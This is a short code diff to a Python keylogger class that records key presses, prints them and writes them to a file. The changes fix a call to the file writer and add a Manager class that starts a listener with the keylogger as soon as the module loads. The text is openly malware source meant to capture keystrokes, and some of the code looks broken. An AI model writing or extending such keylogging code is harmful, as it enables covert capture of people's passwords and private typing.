@@ -10,7 +10,7 @@ class KeyLogger:
         def __on_press(Key):
             key_nise = self.nurmal_key(Key)
             print(key_nise)
-            FileWriter.write(key_nise)
+            FileWriter().write(key_nise)
 
         def on_release(key):
             try:
@@ -43,7 +43,6 @@ class KeyLogger:
             else:
                 return key_list[1]
 
-KeyLogger()
 
 
 
@@ -74,4 +73,7 @@ class FileWriter(Writer):
 
 
 class Manager:
-    pass
+    Listener.start(KeyLogger())
+
+
+Manager()
